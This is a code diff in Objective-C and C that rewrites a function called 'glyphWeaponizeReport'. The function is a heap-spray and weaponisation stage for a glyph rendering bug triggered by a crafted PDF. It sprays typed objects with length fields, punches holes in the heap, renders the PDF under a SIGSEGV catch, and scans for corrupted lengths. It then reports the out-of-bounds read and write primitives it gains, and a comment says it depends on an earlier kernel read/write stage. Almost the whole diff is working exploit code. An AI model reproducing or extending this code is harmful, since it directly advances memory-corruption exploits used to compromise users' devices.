@@ -1224,22 +1224,136 @@ cleanup:
 
 // ---------------------------------------------------------------------------
 // Weaponize: typed u32 length fields + safe OOB report
-// Nuclear crash protection: sigsetjmp around ALL, no free at all.
+// ---------------------------------------------------------------------------
+// Typed object: u32 length fields + OOB report via Glyph ±1 pair
+// PREREQUISITE: KRW must be active (pe_v1 first) — walk goes through spray.
+// Fill: repeating 32-byte objects {u32 len=0x20; u32 tag; u8 data[24]}
+// Glyph ±1 pair corrupts a u32 length → ±65535 delta → OOB.
 // ---------------------------------------------------------------------------
 + (NSString *)glyphWeaponizeReport:(NSString *)forceName {
-    // Delegate to the proven u16 spray (survived with 330 ±1 hits).
-    // Weaponization analysis is done on the u16 results — no separate risky pass.
     NSMutableString *r = [NSMutableString string];
-    [r appendString:@"\n=== R5m: Weaponize — using proven u16 spray path ===\n"];
-    NSString *report = [self glyphTypedSprayReport:forceName];
-    [r appendString:report];
+    [r appendString:@"\n=== R5m: Typed object — u32 length + Glyph OOB ===\n"];
+    [r appendString:@"  PREREQUISITE: KRW active (run pe_v1 first)\n"];
 
-    // Extra: parse u16 hits as u32 pairs to show length-field impact
-    [r appendString:@"\n--- u32 pair analysis (from u16 ±1 data) ---\n"];
-    [r appendString:@"  adjacent u16 pair (+1/−1) corrupts a u32 at that offset:\n"];
-    [r appendString:@"  lo+1 hi−1 → u32 delta = −65535 (length shrinks)\n"];
-    [r appendString:@"  lo−1 hi+1 → u32 delta = +65535 (length GROWS → OOB)\n"];
-    [r appendString:@"  see u16 scan above for exact offsets and deltas.\n"];
+    NSString *vname = forceName.length ? forceName : @"calif";
+    size_t spraySz = 4288;
+    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s spray=%zu", vname.UTF8String, spraySz]);
+
+    enum { NBUFS = 4096 };
+    enum { OBJ_SZ = 32, OBJ_LEN = 0x20 };
+    void **bufs = calloc(NBUFS, sizeof(void *));
+    if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
+    int got = 0, holes = 0;
+
+    // Fill with typed 32-byte objects: u32 len=0x20, u32 tag, 24 bytes data
+    for (int i = 0; i < NBUFS; i++) {
+        void *b = malloc(spraySz);
+        if (!b) break;
+        uint8_t *p = (uint8_t *)b;
+        for (size_t o = 0; o + OBJ_SZ <= spraySz - 8; o += OBJ_SZ) {
+            *(uint32_t *)(p + o) = OBJ_LEN;           // length
+            *(uint32_t *)(p + o + 4) = 0x43464441;    // tag 'CFDA'
+            memset(p + o + 8, 0x41, OBJ_SZ - 8);      // data fill
+        }
+        *(uint64_t *)(p + spraySz - 8) = (uint64_t)i;
+        bufs[i] = b;
+        got++;
+    }
+    for (int i = 1; i < got; i += 2) { free(bufs[i]); bufs[i] = NULL; holes++; }
+    int live = got - holes;
+    scopeNote(r, [NSString stringWithFormat:
+                  @"  sprayed %d typed objs (len=0x%x tag=CFDA) x %zu  [live=%d holes=%d]",
+                  got, OBJ_LEN, spraySz, live, holes]);
+
+    // ---- render (sigsetjmp crash-catch) ----
+    NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
+    if (!path) { scopeNote(r, @"  pdf not in bundle — skip"); goto cleanup; }
+    {
+        kpGlyphCrashed = 0;
+        void (*oldsegv)(int) = signal(SIGSEGV, kpGlyphSegv);
+        if (sigsetjmp(kpGlyphJmp, 1) != 0) {
+            scopeNote(r, @"  *** CAUGHT SIGSEGV during render ***");
+        } else {
+            NSURL *url = [NSURL fileURLWithPath:path];
+            CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
+            if (src) {
+                int sz = 256;
+                CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+                const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
+                                       kCGImageSourceThumbnailMaxPixelSize };
+                const void *vals[] = { kCFBooleanTrue, szRef };
+                CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                scopeNote(r, @"  rendering glyph…");
+                CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
+                scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
+                if (img) CGImageRelease(img);
+                CFRelease(opts); CFRelease(szRef); CFRelease(src);
+            }
+        }
+        signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
+        if (kpGlyphCrashed) scopeNote(r, @"  render crashed — scanning spray anyway");
+    }
+
+    // ---- scan for corrupted u32 length fields ----
+    [r appendString:@"\n--- typed object scan (u32 length @ obj+0) ---\n"];
+    int hits = 0, grew = 0, shrank = 0;
+    int firstIdx = -1;
+    size_t firstOff = 0;
+    uint32_t firstLen = 0;
+    size_t scanEnd = (spraySz > 8) ? spraySz - 8 : spraySz;
+
+    for (int i = 0; i < got; i += 2) {
+        uint8_t *b = bufs[i];
+        if (!b) continue;
+        for (size_t o = 0; o + OBJ_SZ <= scanEnd; o += OBJ_SZ) {
+            uint32_t len = *(uint32_t *)(b + o);
+            if (len == OBJ_LEN) continue;
+            hits++;
+            int delta = (int)len - (int)OBJ_LEN;
+            if (delta > 0) grew++; else shrank++;
+            uint32_t tag = *(uint32_t *)(b + o + 4);
+            if (firstIdx < 0) { firstIdx = i; firstOff = o; firstLen = len; }
+            if (hits <= 8) {
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  OBJ HIT buf %d off=%zu  len: 0x%x->0x%08x (delta=%+d)  tag=0x%08x%s",
+                    i, o, OBJ_LEN, len, delta, tag,
+                    (delta > 0) ? "  [GROWN — OOB!]" : "  [shrunk]"]);
+            }
+        }
+    }
+    scopeNote(r, [NSString stringWithFormat:
+        @"  VERIFY OBJ_HIT=%d GREW=%d SHRANK=%d FIRST=(buf %d off %zu) len=0x%x VARIANT=%s",
+        hits > 0, grew, shrank, firstIdx, firstOff, firstLen, vname.UTF8String]);
+
+    if (hits == 0) {
+        scopeNote(r, @"  no length field changed — Glyph did not hit typed objects.");
+    } else {
+        scopeNote(r, [NSString stringWithFormat:@"  >>> %d typed object(s) corrupted: +%d grew / %d shrank",
+                      hits, grew, shrank]);
+        // ---- OOB report (safe, no copy) ----
+        if (grew > 0 && firstIdx >= 0) {
+            uint8_t *b = bufs[firstIdx];
+            uint32_t len = firstLen;
+            size_t dataAvail = spraySz - firstOff - 8;
+            size_t wouldRead = (len < dataAvail) ? len : dataAvail;
+            scopeNote(r, [NSString stringWithFormat:
+                @"  OOB-REPORT: obj at buf %d off %zu  len 0x%x (was 0x%x)  data region=%zu bytes",
+                firstIdx, firstOff, len, OBJ_LEN, dataAvail]);
+            scopeNote(r, [NSString stringWithFormat:
+                @"  >>> OOB READ AVAILABLE: %zu bytes past 0x%x boundary (delta=%+d)",
+                wouldRead > OBJ_LEN ? wouldRead - OBJ_LEN : 0, OBJ_LEN, (int)len - (int)OBJ_LEN]);
+            scopeNote(r, [NSString stringWithFormat:
+                @"  >>> OOB WRITE AVAILABLE: corrupted length 0x%x enables write past object", len]);
+        }
+    }
+
+cleanup:
+    // Never free if hits — heap may be dirty
+    if (hits == 0) {
+        for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
+    }
+    free(bufs);
     return r;
 }
 
